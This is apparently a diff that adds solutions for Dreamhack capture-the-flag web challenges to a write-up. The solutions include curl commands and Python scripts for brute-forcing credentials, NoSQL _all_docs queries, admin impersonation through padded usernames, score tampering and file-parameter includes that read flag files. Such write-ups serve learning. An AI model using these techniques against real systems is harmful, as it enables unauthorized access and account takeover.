@@ -293,3 +293,242 @@ Then get the flag:
 ```bash
 curl -X POST http://host8.dreamhack.games:22666/flag --data-urlencode "key=409ac0d96943d3da52f176ae9ff2b974" --data-urlencode "cmd_input="
 ```
+
+## NoSQL-CouchDB
+
+Use this curl command to get the flag:
+
+```bash
+curl -X POST http://host8.dreamhack.games:9144/auth \
+     -H "Content-Type: application/json" \
+     -d '{"uid": "_all_docs"}'
+```
+
+## Type c-j
+
+Submit payload (you may need several tries since the ID will be generated new every time):
+
+```
+ID: 0000000000
+Password: 00000356
+```
+
+## random-test
+
+Brute-force the `locker_num`:
+
+```python
+import requests
+import string
+
+target_url = "http://host8.dreamhack.games:23474/"
+
+alphanumeric = string.ascii_lowercase + string.digits
+
+got_locker_num = ""
+for i in range(0,4):
+    for char in alphanumeric:
+        print(f"Tried {got_locker_num}{char}")
+
+        res = requests.post(target_url, data={"locker_num": f"{got_locker_num}{char}"})
+
+        if "Good" in res.text:
+            print()
+            got_locker_num += char
+            print(f"Got {got_locker_num}")
+            break
+```
+
+Brute-force the `password` and get the flag:
+
+```python
+import requests
+
+target_url = "http://host8.dreamhack.games:23474/"
+
+locker_num = "r5ky"
+for i in range(100,201):
+
+    print(f"Tried {i}")
+
+    res = requests.post(target_url, data={"locker_num": locker_num, "password": i})
+
+    if "FLAG" in res.text:
+        print()
+        print(f"FOUND {i}!!!")
+        print(res.text)
+        break
+```
+
+## [wargame.kr] tmitter
+
+Sign up with:
+
+```
+ID: admin                           z
+PS: password123
+```
+
+Using `python`:
+
+```python
+import requests
+
+URL = "http://host8.dreamhack.games:22898/join.php"
+
+username = "admin" + (" " * 27) + "z"
+password = "password123"
+
+data = {
+    'id': username,
+    'ps': password
+}
+
+response = requests.post(URL, data=data)
+
+
+if "admin is exist" in response.text:
+    print("Failed")
+else:
+    print("Registeration successfully")
+```
+
+Then login with:
+
+```
+ID: admin
+PS: password123
+```
+
+## mongoboard
+
+Get `/api/board`:
+
+```json
+[
+  {
+    "_id": "694cd854769d5ba415910334",
+    "title": "Hello",
+    "author": "guest",
+    "secret": false,
+    "publish_date": "2025-12-25T06:23:16.077Z"
+  },
+  {
+    "_id": "694cd856769d5ba415910335",
+    "title": "Mongo",
+    "author": "guest",
+    "secret": false,
+    "publish_date": "2025-12-25T06:23:18.086Z"
+  },
+  {
+    "_id": null,
+    "title": "FLAG",
+    "author": "admin",
+    "secret": true,
+    "publish_date": "2025-12-25T06:23:21.087Z"
+  },
+  {
+    "_id": "694cd85c769d5ba415910337",
+    "title": "Good",
+    "author": "guest",
+    "secret": false,
+    "publish_date": "2025-12-25T06:23:24.088Z"
+  }
+]
+```
+
+Calculate the timestamp to predict the `_id` value of the secret.
+
+## [wargame.kr] fly me to the moon
+
+Get flag:
+
+```python
+import requests
+
+URL = "http://host8.dreamhack.games:13234"
+
+session = requests.Session()
+
+response = session.get(f"{URL}/token.php")
+token = response.text
+
+print(f"Token: {token}")
+
+data = {
+    "token": token,
+    "score": 999999
+}
+
+res = session.post(f"{URL}/high-scores.php", data=data)
+
+print(res.text)
+```
+
+## out of money
+
+Loan (1000) -> Convert all to Dnyang Coin -> Return as collateral -> Split the Dnyang Coin loan into several installments (over 2000) -> Return to Santa Private Exchange and return 1000 to DHH -> Pay off debt -> Similarly, if you return Dnyang Coin to DHH, the debt will be 0, and DHH will be 1000 -> You can obtain a flag!
+
+## simple-phparse
+
+Visit `//flag.php` to get the flag.
+
+## Base64 based
+
+Base64 encoded `./flag.php`:
+
+```
+Li9mbGFnLnBocA==
+```
+
+Then visit `/index.php?file=Li9mbGFnLnBocA==` to get the flag.
+
+## amocafe
+
+Use function to get the menu number:
+
+```python
+def solve_menu(menu_str):
+    def parse(index, nibbles):
+        if index == len(menu_str):
+            if len(nibbles) == 16:
+                return nibbles
+            return None
+
+        if len(nibbles) >= 16:
+            return None
+
+        char = menu_str[index]
+
+        val = None
+        if char == '_': val = 11
+        elif 'c' <= char <= 'f': val = int(char, 16)
+        elif char in '023456789': val = int(char)
+
+        if val is not None:
+            return parse(index + 1, nibbles + [val])
+
+        if char == '1':
+            res = parse(index + 1, nibbles + [1])
+            if res: return res
+            if index + 1 < len(menu_str) and menu_str[index+1] == '0':
+                res = parse(index + 2, nibbles + [10])
+                if res: return res
+
+        return None
+
+    result = parse(0, [])
+
+    hex_str = "".join([hex(x)[2:] for x in result])
+
+    final_int = int(hex_str, 16)
+    print(f"Calculated Input: {final_int}")
+```
+
+Then submit it to get the flag.
+
+## baby-Case
+
+```bash
+curl -X POST "http://host3.dreamhack.games:20701/shoP" -d "leg=flag"
+```
